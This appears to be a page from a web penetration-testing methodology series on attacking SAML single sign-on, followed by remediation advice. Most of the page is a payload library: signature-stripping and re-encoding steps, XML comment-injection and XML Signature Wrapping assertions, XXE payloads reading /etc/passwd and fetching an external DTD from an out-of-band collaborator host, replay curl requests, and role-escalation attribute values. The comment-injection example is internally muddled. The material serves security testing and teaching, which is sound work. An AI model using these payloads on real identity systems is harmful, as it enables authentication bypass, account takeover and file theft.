---
title: "SAML Attacks"
date: 2026-02-24
draft: false
---

# SAML Attacks

> **Severity**: Critical | **CWE**: CWE-287, CWE-347, CWE-611
> **OWASP**: A07:2021 – Identification and Authentication Failures

---

## What Is SAML?

SAML (Security Assertion Markup Language) is an XML-based SSO standard. The Service Provider (SP) delegates authentication to an Identity Provider (IdP). The IdP returns a signed **SAML Assertion** inside a **SAMLResponse**, which the SP must validate before granting access.

```
User → SP → (redirect) → IdP → (user authenticates) → IdP issues SAMLResponse
           ← POST SAMLResponse ← (redirect back to SP ACS URL)
SP validates signature → extracts NameID/attributes → creates session
```

**Critical fields in a SAMLResponse**:
```xml
<saml:NameID>user@corp.com</saml:NameID>      ← who is logging in
<saml:Attribute Name="Role">admin</saml:Attribute>  ← what privileges
<ds:Signature>...</ds:Signature>               ← must be verified
```

---

## Discovery Checklist

- [ ] Find SAML SSO endpoint — look for `SAMLResponse` in POST requests (Burp Proxy)
- [ ] Find ACS (Assertion Consumer Service) URL in metadata: `/saml/acs`, `/saml2/idp/SSO`
- [ ] Retrieve SP metadata: `/saml/metadata`, `/Saml2/metadata`, `/sso/saml`
- [ ] Base64-decode and XML-parse the SAMLResponse
- [ ] Check for XML signature validation (signature stripping)
- [ ] Check for XML comment injection in NameID
- [ ] Check for XSLT injection in Signature transforms
- [ ] Test `NameID` manipulation
- [ ] Test `Destination` attribute — is it validated?
- [ ] Check for XXE in SAML XML
- [ ] Test replay attacks (lack of `NotOnOrAfter` enforcement)
- [ ] Test SAML assertion wrapping
- [ ] Test `InResponseTo` not validated (CSRF-equivalent)

---

## Payload Library

### Attack 1 — Signature Stripping (Most Common)

Many SAML libraries verify a signature if present, but do **not** require it to be present. Removing the signature element causes the library to accept unsigned assertions.

```bash
# Step 1: Intercept SAMLResponse in Burp (POST to ACS endpoint)
# Step 2: URL-decode the SAMLResponse value
# Step 3: Base64-decode
base64 -d <<< "BASE64_SAML_RESPONSE" > saml_response.xml

# Step 4: Examine XML structure:
cat saml_response.xml | xmllint --format -

# Step 5: Remove entire <ds:Signature>...</ds:Signature> block
# Step 6: Optionally modify NameID or attributes
# Step 7: Re-encode and submit:
cat modified_saml.xml | base64 -w0 | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))"

# Burp workflow:
# 1. Intercept POST to /saml/acs
# 2. SAMLResponse parameter → Send to Repeater
# 3. Decode SAMLResponse (URL decode → base64 decode)
# 4. Edit XML → remove Signature
# 5. Re-encode and re-send
```

### Attack 2 — XML Comment Injection (SAML Confusion Attack)

Many parsers strip XML comments before processing but after signature validation — a signed response with a comment in the NameID validates signature correctly, then comment is stripped to yield a different NameID.

```xml
<!-- Signed NameID contains comment that gets stripped: -->
<saml:NameID>victim<!--INJECTED COMMENT-->@corp.com</saml:NameID>

<!-- After signature validates (over the literal string including comment),
     some parsers normalize and produce: -->
<saml:NameID>victim@corp.com</saml:NameID>

<!-- Attacker controls own account: attacker@evil.com -->
<!-- Craft assertion where NameID is: attacker<!---->@corp.com -->
<!-- Signature covers: "attacker<!---->@corp.com" (attacker controls) -->
<!-- Parser yields: attacker@corp.com (admin user) -->

<!-- Example malicious NameID -->
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
  attacker<!-- injected -->@corp.com
</saml:NameID>
```

```bash
# Automate with SAML Raider (Burp extension):
# 1. Intercept SAMLResponse
# 2. SAML Raider → decode → edit NameID → add XML comment
# 3. Re-sign with forged cert or test without re-signing (signature strip)
```

### Attack 3 — XSW (XML Signature Wrapping)

XSW exploits the difference between which element is signed and which element is actually processed. An attacker copies the signed assertion, modifies the copy, and places it in a position the XML validator ignores but the business logic processes.

```xml
<!-- Original signed assertion (reference ID = _abc123): -->
<samlp:Response>
  <saml:Assertion ID="_abc123">
    <ds:Signature>
      <ds:Reference URI="#_abc123"/>
      <!-- signature over original assertion -->
    </ds:Signature>
    <saml:NameID>legitimateuser@corp.com</saml:NameID>
  </saml:Assertion>
</samlp:Response>

<!-- XSW Attack — inject unsigned evil assertion before the signed one: -->
<samlp:Response>
  <!-- UNSIGNED evil assertion — processed by app logic (it's first): -->
  <saml:Assertion ID="_evil999">
    <saml:NameID>admin@corp.com</saml:NameID>
  </saml:Assertion>

  <!-- Original signed assertion (validator checks this one): -->
  <saml:Assertion ID="_abc123">
    <ds:Signature>
      <ds:Reference URI="#_abc123"/>
    </ds:Signature>
    <saml:NameID>legitimateuser@corp.com</saml:NameID>
  </saml:Assertion>
</samlp:Response>

<!-- If app processes first Assertion and validator checks Reference URI → bypass -->
```

```bash
# 8 known XSW variants (XSW1–XSW8):
# Tool: SAMLRaider Burp extension
# XSW1: evil assertion before signed assertion
# XSW2: evil assertion after signed assertion
# XSW3: signed assertion moved inside evil assertion
# XSW4-8: variations with Response/Assertion wrapping combinations

# SAMLRaider XSW testing:
# 1. Intercept SAMLResponse in Burp
# 2. Send to SAMLRaider tab
# 3. Click "XXEK Attack" or "XSW Attack 1-8"
# 4. Send each variant
```

### Attack 4 — SAML XXE

SAML is XML — if the SAMLResponse is parsed by a non-hardened XML parser, XXE applies.

```xml
<!-- Inject DOCTYPE into SAMLResponse: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Assertion>
    <saml:NameID>&xxe;</saml:NameID>
  </saml:Assertion>
</samlp:Response>

<!-- Blind OOB XXE via external DTD: -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR_ID.oast.pro/evil.dtd">
  %xxe;
]>
```

```bash
# Steps:
# 1. Decode SAMLResponse
# 2. Add DOCTYPE after XML declaration
# 3. Re-encode and submit
# 4. Monitor Burp Collaborator or interactsh for OOB

# Check if SAMLResponse preserves DOCTYPE through decode/encode cycle
# Some frameworks strip DOCTYPE → fallback to OOB
```

### Attack 5 — Signature Algorithm Downgrade

```xml
<!-- Original assertion signed with RS256 (RSA-SHA256) -->
<!-- Attempt to substitute weak algorithm: -->
<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
<!-- Or completely broken: -->
<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#dsa-sha1"/>

<!-- If library accepts legacy algorithms without enforcement:
     brute-force or forge signature becomes easier -->
```

### Attack 6 — Replay Attack (Missing NotOnOrAfter Enforcement)

```bash
# SAML assertions have time restrictions:
# NotBefore + NotOnOrAfter in <saml:Conditions>
# If server doesn't enforce these → replay old assertions

# Capture a valid SAMLResponse
# Re-submit the same response hours/days later:
curl -X POST https://app.com/saml/acs \
  -d "SAMLResponse=OLD_VALID_RESPONSE" \
  -b "session=none"

# Also test: submit valid assertion to wrong SP
# Destination attribute should match SP's ACS URL — check if validated
```

### Attack 7 — Attribute Escalation

```xml
<!-- Some apps grant roles based on SAML attributes: -->
<saml:AttributeStatement>
  <saml:Attribute Name="Role">
    <saml:AttributeValue>user</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>

<!-- Modify to admin (requires signature stripping or XSW): -->
<saml:AttributeStatement>
  <saml:Attribute Name="Role">
    <saml:AttributeValue>admin</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>

<!-- Additional attributes to try: -->
<saml:AttributeValue>superadmin</saml:AttributeValue>
<saml:AttributeValue>administrator</saml:AttributeValue>
<saml:AttributeValue>DOMAIN\Domain Admins</saml:AttributeValue>
```

---

## Tools

```bash
# SAML Raider — Burp Suite extension (essential):
# - Install from BApp Store
# - Decode/encode SAMLResponse in place
# - XSW attack automation (XSW1-8)
# - Certificate management and re-signing
# - XXEK (XML External Entity via SAML) testing

# SAMLTool — online decoder/encoder:
# https://www.samltool.com/decode.php (offline testing only)

# Manual decode/inspect:
# 1. Grab SAMLResponse from Burp POST body
# 2. URL decode, then base64 decode:
python3 -c "
import base64, urllib.parse, sys
data = sys.argv[1]
data = urllib.parse.unquote(data)
print(base64.b64decode(data).decode())
" 'URL_ENCODED_SAML_RESPONSE'

# Pretty-print XML:
echo "BASE64_VALUE" | base64 -d | xmllint --format -

# SAMLReQuest — Python SAML testing tool:
pip3 install saml2
# or use python3-saml for crafting assertions

# Test XXE in SAML:
# Modify decoded XML → add DOCTYPE → re-encode → submit via Burp

# OneLogin SAML toolkit test (SP-initiated flow):
# Capture IdP-initiated vs SP-initiated → different attack surfaces

# SAMLscanner:
git clone https://github.com/CommonsC/saml_scanner
```

---

## Remediation Reference

- **Require signature**: reject SAMLResponses/Assertions with no signature
- **Verify signature over the correct element**: use `ID` attribute reference validation
- **Disable DOCTYPE/DTD processing** in XML parser to prevent XXE
- **Strict `Destination` validation**: check ACS URL matches expected SP URL
- **Enforce time conditions**: validate `NotBefore` and `NotOnOrAfter` with ±5min clock skew
- **`InResponseTo` validation**: verify assertion is response to a specific AuthnRequest (prevents unsolicited assertions and replay)
- **Allowlist NameID formats**: reject formats not expected by the application
- **Use updated SAML libraries**: older onelogin/python-saml, ruby-saml versions had critical bypass bugs

*Part of the Web Application Penetration Testing Methodology series.*
